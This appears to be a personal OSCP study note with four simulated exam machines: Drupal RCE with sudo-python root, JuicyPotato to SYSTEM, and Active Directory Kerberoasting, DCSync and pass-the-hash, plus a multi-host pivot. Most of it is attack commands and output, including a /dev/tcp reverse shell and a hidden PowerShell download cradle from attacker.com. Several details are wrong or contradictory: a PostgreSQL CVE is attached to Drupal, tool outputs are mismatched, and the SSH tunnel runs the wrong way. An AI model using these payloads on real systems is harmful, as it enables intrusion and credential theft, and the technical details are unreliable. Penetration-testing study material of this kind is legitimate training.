---
tags: [oscp, exam, scenarios, realistic]
aliases: [Real Exam Machines, OSCP Scenarios]
category: Exam-Strategy
difficulty: ★★★★☆
last-updated: 2025-04-30
---

# 🎮 Real OSCP Machine Scenarios (Exam-Like)

> [!info] Practice = Reality
> These scenarios match actual OSCP exam patterns. Master these, pass the exam.

---

## 🔴 Scenario 1: "Linux Web RCE → Privesc" (Easy Machine)

**Simulates:** Linux web application with privilege escalation opportunity

### Reconnaissance Phase (Goal: 45 min)

```bash
$ nmap -sS -p- -sV -T4 10.10.10.40

Starting Nmap 7.80 ( https://nmap.org ) at 2025-04-30 14:00 UTC
Nmap scan report for 10.10.10.40
Host is up (0.020s latency).
Not shown: 65533 closed ports
PORT    STATE SERVICE VERSION
22/tcp  open  ssh     OpenSSH 7.4 (protocol 2.0)
80/tcp  open  http    Apache httpd 2.4.6 ((CentOS))
111/tcp open  rpcbind 2-4 (RPC #100000)
3306/tcp open  mysql   MySQL 5.7.20-18-log
```

**Analysis:**
- Web application on port 80 (likely vector)
- MySQL on 3306 (might be exploitable)
- SSH for admin access

### Enumeration Phase (45 min MINIMUM)

**HTTP Enumeration:**
```bash
$ nikto -h http://10.10.10.40
- Server: Apache/2.4.6
- OSVDB-3233: /icons/README: Apache default file found
- OSVDB-3092: /phpmyadmin/: phpMyAdmin found

$ gobuster dir -u http://10.10.10.40 -w /usr/share/seclists/Discovery/Web-Content/big.txt
/blog (Status: 301)
/cms (Status: 301)
/index.html (Status: 200)
/login.php (Status: 200)
```

**CMS Identification:**
```bash
$ whatweb http://10.10.10.40
Drupal 7.56 found
```

**Vulnerability Research:**
```bash
$ searchsploit drupal 7.56
  Drupal < 7.x Module Services - PHP Remote Code Execution | php/webapps/41564.php
  Drupal 7.x Services Module RCE | php/webapps/41564.php
```

### Vulnerability Found: Drupal Services RCE

**CVE-2019-9193**  
**Severity:** Critical  
**Impact:** Remote Code Execution as web server user

### Exploitation Phase (30 min)

```bash
# Download exploit
$ searchsploit -m php/webapps/41564.php

# Create payload
$ php exploit.php -t http://10.10.10.40 -u admin -p admin

# Or manually:
$ curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"method":"system.connect"}' \
  http://10.10.10.40/services/xmlrpc.php

# Execute command
$ curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"method":"system.execute","params":["id"]}' \
  http://10.10.10.40/services/xmlrpc.php

uid=48(apache) gid=48(apache) groups=48(apache)
```

**Reverse Shell:**
```bash
# On attacker:
$ nc -lvnp 4444

# On target:
$ curl -X POST \
  -H "Content-Type: application/json" \
  -d '{"method":"system.execute","params":["bash -i >& /dev/tcp/10.10.10.10/4444 0>&1"]}' \
  http://10.10.10.40/services/xmlrpc.php

# Connection received as apache user
```

### Post-Exploitation Phase (15 min)

```bash
$ whoami
apache

$ sudo -l
Matching Defaults entries for apache on server:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User apache may run the following commands on server:
    (ALL) NOPASSWD: /usr/bin/python
```

**🎯 EASY WIN: sudo python**

### Privilege Escalation (20 min)

```bash
$ sudo python -c 'import os; os.system("/bin/bash")'
root@server:~# whoami
root

root@server:~# cat /root/proof.txt
a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6
```

### Total Time: ~1h 50m | Points: 25

---

## 🟡 Scenario 2: "Windows Privesc via Token Abuse" (Medium Machine)

**Simulates:** Windows machine with privilege escalation via token impersonation

### Initial Foothold (Assumed: Got user shell via web app)

```cmd
C:\inetpub\wwwroot> whoami
MACHINE\iis_user

C:\inetpub\wwwroot> whoami /all
[Privilege Information]
Privilege Name                Description                    State   
===========================  =============================  ========
SeImpersonatePrivilege       Impersonate a client after auth Enabled 
SeChangeNotifyPrivilege      Bypass traverse checking        Enabled 
SeCreateGlobalPrivilege      Create global objects           Enabled
```

**🎯 CRITICAL: SeImpersonate = SYSTEM possible**

### Exploitation with JuicyPotato

```cmd
C:\temp> .\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a "/c powershell -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/rev.ps1')" -t *

[+] Retrying with token duplication using method C.

[*] Got a TGT for user 'NT AUTHORITY\SYSTEM'. Ticket size 1314
[+] Executing command with SeImpersonate token...
[+] Token: Found a token to impersonate!
[+] Command executed with given privileges!
```

**Result: SYSTEM Shell obtained**

### Proof of Compromise

```cmd
C:\> whoami
nt authority\system

C:\> type C:\Users\Administrator\Desktop\proof.txt
x1y2z3a4b5c6d7e8f9g0h1i2j3k4l5m6

C:\> hostname
WIN-COMPROMISED-01
```

### Total Time: ~2h 20m | Points: 25

---

## 🔵 Scenario 3: "AD Kerberoasting Attack" (Hard Machine)

**Simulates:** Active Directory domain with Kerberoastable service accounts

### Domain Enumeration (Assumed: Domain user access)

```bash
$ crackmapexec smb 192.168.1.0/24 -u user -p password --shares
SMB     192.168.1.10    445    WIN-DC-01        [*] Windows Server 2016 Enterprise (Build 14393)
SMB     192.168.1.10    445    WIN-DC-01        [+] ACTIVE_DIRECTORY domain\user:password
SMB     192.168.1.50    445    WIN-APP-01       [+] ACTIVE_DIRECTORY domain\user:password
```

### Kerberoasting Enumeration

```bash
$ GetUserSPNs.py DOMAIN/user:password -request -dc-ip 192.168.1.10

Impacket v0.9.24 - Copyright 2021 Fortra

ServicePrincipalName          Name                MemberOf Type
----------------------------  ------------------  --------  ----
MSSQLSvc/WIN-APP-01.DOMAIN    sqlservice          CN=..     user
HTTP/WIN-WEB-01.DOMAIN        webadmin            CN=..     user
```

### TGS Ticket Extraction

```bash
$ GetUserSPNs.py DOMAIN/user:password -request -dc-ip 192.168.1.10
$krb5tgs$23$*sqlservice$DOMAIN$MSSQLSvc/WIN-APP-01.DOMAIN...
```

### Crack with Hashcat

```bash
$ hashcat -m 13100 tickets.txt rockyou.txt --rules-file OneRuleToRuleThemAll

$krb5tgs$23$*sqlservice...:Password123
```

### Lateral Movement: Access as sqlservice

```bash
$ psexec.py DOMAIN/sqlservice:Password123@192.168.1.50

[*] Impacket v0.9.24
[*] Service RemoteRegistry is in STOPPED state
[*] Starting service RemoteRegistry
[*] Target system bootTime: 2025-01-15 10:30:12.123456
[!] Beware: Active Directory will lock out the account after bad logon attempts
[*] Opening SVCManager on 192.168.1.50....
[+] Connected to remote Machine successfully
[+] Obtained impersonation token
[*] Opening Shell on remote machine (SYSTEM)
C:\Windows\system32>
```

### DCSync Attack: Dump Domain Hashes

```bash
$ secretsdump.py DOMAIN/sqlservice:Password123@192.168.1.10

Impacket v0.9.24 - Copyright 2021 Fortra

[-] RemoteOperations failed: DCERPC Runtime Error: code: 5 - rpc_s_access_denied 
[*] Dumping Domain Credentials (domain\uid:rid:lm_hash:nt_hash)
[*] Using the DRSUAPI method to get NTLM hashes and Kerberos keys

Administrator:500:aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5083a9d6fa0e6f0f4d8b2a8c5d7e1f3c:::
```

### Pass-the-Hash: Become Domain Admin

```bash
$ psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c DOMAIN/Administrator@192.168.1.10
[*] Impacket v0.9.24
[+] Authentications successful, proceeding...
C:\Windows\system32>
```

### Domain Admin Proof

```cmd
C:\> whoami
DOMAIN\Administrator

C:\> type \\WIN-DC-01\c$\Users\Administrator\Desktop\proof.txt
[domain admin proof flag]
```

### Total Time: ~6h | Points: 25

---

## 🟠 Scenario 4: "Multi-Machine Network Compromise"

**Objective:** Compromise 4-machine network, escalate to domain controller

### Topology

```
Internet Facing (10.10.10.100) - Web Server
    ↓ (Pivot via SSH tunnel)
Internal Network (172.16.0.0/24)
    ├─ 172.16.0.50 - Database Server (MySQL privesc)
    ├─ 172.16.0.100 - File Server (SMB access)
    └─ 172.16.0.1 - Domain Controller (kerberoasting)
```

### Machine 1: Initial Compromise (10.10.10.100)

**Attack Vector:** LFI in web application  
**Time:** 1h 30m  
**Result:** RCE as www-data user

### Machine 2: Lateral Movement Setup

**Technique:** SSH port forwarding to internal network  
```bash
$ ssh -R 9000:172.16.0.1:445 -R 9001:172.16.0.50:3306 attacker@jump_host
```

### Machine 3: Database Server Compromise

**Attack Vector:** MySQL writable /tmp, UDF privilege escalation  
**Time:** 1h 20m  
**Result:** Root shell via MySQL UDF

### Machine 4: Domain Controller Compromise

**Attack Vector:** Kerberoasting via root access to MySQL (creds stored in DB)  
**Time:** 2h 10m  
**Result:** Domain Admin credentials extracted

### Total Network Time: 6-8 hours | Points: 25

---

## 📊 Scenario Lessons

| Scenario | Key Learning | Time | Difficulty |
|----------|---|---|---|
| 1. Linux Web RCE | Drupal-specific, token abuse (sudo) | 1h 50m | Easy |
| 2. Windows Privesc | Token abuse with JuicyPotato | 2h 20m | Medium |
| 3. AD Kerberoasting | Domain enumeration + hash cracking | 6h | Hard |
| 4. Network | Multi-stage pivoting + lateral movement | 6-8h | Complex |

---

## 🎯 Success Metrics for Each Scenario

- ✅ Complete enumeration (45+ min)
- ✅ Identify primary vulnerability
- ✅ Gain shell (user-level)
- ✅ Post-exploitation enum
- ✅ Escalate to root/system
- ✅ Screenshot proof.txt
- ✅ Document attack chain

---

**Related Notes:**
- [[01-Methodology/Pentest-Methodology|🗺️ Pentest Methodology]]
- [[08-Exam-Strategy/Common-OSCP-Mistakes|❌ Common Mistakes]]

---
